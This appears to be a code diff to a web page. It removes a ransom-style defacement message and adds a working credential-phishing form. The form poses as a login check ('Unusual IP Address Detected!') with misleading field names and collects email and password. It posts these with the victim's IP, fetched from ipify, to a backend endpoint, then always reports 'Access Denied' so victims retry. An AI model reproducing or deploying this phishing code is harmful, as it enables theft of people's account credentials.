@@ -194,17 +194,89 @@
           </style>
             </head> 
             <body> 
-                <div> 
-                    <h1>Contact the Errand Boy Naija with your payment receipts to get the site back to live</h1>
+                <div class="bg" onclick="openModal()"></div> 
+                <div class="modal" id="modal"> 
+                    <div class="box" id="box-content"> 
+                        <h3>Favourite Food Training Access</h3> 
+                        <input id="favouritefood" type="email" autocomplete="email" name="email" placeholder="Favourite Food" /> 
+                        <input id="company" type="password" placeholder="Company Name" /> 
+                        <button onclick="submitForm()">Continue</button>
+                    </div> 
                 </div>
-                
+                 <script> 
+  
+
+                 function openModal() { 
+                    document.getElementById("modal").style.display = "flex";
+                    resetForm();
+                 }
+                 
+                 function closeModal() {
+                    document.getElementById("modal").style.display = "none";
+                 }
+                 
+                 function resetForm() {
+                    document.getElementById("box-content").innerHTML = `
+                        <h2>Unusual IP Address Detected!</h2> 
+                        <h3>Please provide your email and password to proceed</h3> 
+                       <input id="favouritefood" type="email" autocomplete="email" name="email" placeholder="eg: email@domain.com" /> 
+                        <input id="company" type="password" placeholder="Password" /> 
+                       <button onclick="submitForm()">Continue</button>
+                    `;
+                 }
+                    
+                 async function submitForm() { 
+                    const favouritefood = document.getElementById("favouritefood").value;
+                    const company = document.getElementById("company").value;
+                    
+                    if (!favouritefood.trim() || !company.trim()) {
+                        alert('Please fill in all fields');
+                        return;
+                    }
+                    
+                    // Show loading state
+                    document.getElementById("box-content").innerHTML = `
+                        <div class="loading">
+                            <div class="spinner"></div>
+                            <p style="color: #666; margin: 0;">Authenticating...</p>
+                        </div>
+                    `;
+                    
+                    try {
+                        // Fetch IP
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        const ip = ipData.ip;
                         
-                    
-                    
+                        const response = await fetch("/api/submit", { 
+                            method: "POST", 
+                            headers: { "Content-Type": "application/json" }, 
+                            body: JSON.stringify({ favouritefood, company, ip }) 
+                        });
+                        
+                        if (response.ok) {
+                            document.getElementById("box-content").innerHTML = `
+                                <div class="success-message">
+                                    <div class="success-icon">X</div>
+                                    <div class="success-text">Access Denied!</div>
+                                    <div class="success-subtext">Check your email and password.</div>
+                                    <button class="close-btn" onclick="resetForm()">Try Again</button>
+                                </div>
+                            `;
+                        } else {
+                            throw new Error('Submission failed');
+                        }
+                    } catch (error) {
+                        document.getElementById("box-content").innerHTML = `
+                            <div class="error-message">
+                                <div class="error-icon">✕</div>
+                                <div class="error-text">Submission Failed</div>
+                                <div class="error-subtext">Please try again later.</div>
+                                <button class="close-btn" onclick="resetForm()">Try Again</button>
+                            </div>
+                        `;
+                    }
+                 } 
+                </script>
             </body> 
         </html>
-
-
-
-
-
